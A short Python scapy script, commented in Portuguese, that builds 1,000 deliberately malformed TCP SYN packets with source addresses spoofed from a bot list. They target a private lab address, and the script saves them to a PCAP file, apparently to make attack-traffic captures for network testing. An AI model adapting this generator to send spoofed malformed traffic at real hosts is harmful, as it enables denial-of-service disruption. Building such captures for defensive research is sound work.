from scapy.all import *
import random
import time
import ipaddress

TARGET_IP = "192.168.100.2"
TARGET_PORT = 50001
BOTFILE = "bots.txt"

PCAP_FILENAME = "tcp_malformed.pcap"

def load_bots(filename):
    bot_ips = []
    with open(filename, "r") as f:
        for line in f:
            ip = line.strip()
            if ip:
                ipaddress.ip_address(ip)
                bot_ips.append(ip)
    return bot_ips

def run_tcp_malformed_attack():
    bot_ips = load_bots(BOTFILE)
    numero_de_pacotes_enviados = 0
    lista_de_pacotes = []

    while True:
        source_ip = random.choice(bot_ips)
        ip_layer = IP(src=source_ip, dst=TARGET_IP)
        eth_layer = Ether()
        seq_num = random.randint(0, 4294967295)

        # Randomize o tipo de "malformação"
        mal_type = random.choice(['dataofs', 'chksum', 'seq', 'len'])

        if mal_type == 'dataofs':
            tcp_layer = TCP(sport=RandShort(), dport=TARGET_PORT, flags='S', seq=seq_num, window=8192, dataofs=3)  # Menor que o mínimo (5)
        elif mal_type == 'chksum':
            tcp_layer = TCP(sport=RandShort(), dport=TARGET_PORT, flags='S', seq=seq_num, window=8192)
            tcp_layer.chksum = 0x1234  # Checksum errado
        elif mal_type == 'seq':
            tcp_layer = TCP(sport=RandShort(), dport=TARGET_PORT, flags='S', seq=-1 & 0xFFFFFFFF, window=8192)  # seq negativo (overflow)
        elif mal_type == 'len':
            tcp_layer = TCP(sport=RandShort(), dport=TARGET_PORT, flags='S', seq=seq_num, window=8192, dataofs=15)  # Header "maior" que o pacote

        packet = eth_layer / ip_layer / tcp_layer 
        lista_de_pacotes.append(packet)
        numero_de_pacotes_enviados += 1

        if numero_de_pacotes_enviados == 1000:
            break

    print(f"Gerando arquivo PCAP com {numero_de_pacotes_enviados} pacotes...")
    wrpcap(PCAP_FILENAME, lista_de_pacotes)
    print(f"Arquivo PCAP '{PCAP_FILENAME}' gerado com sucesso.")

if __name__ == "__main__":
    run_tcp_malformed_attack()

# sudo PYTHONPATH=$HOME/scapy python3 create-malformed.py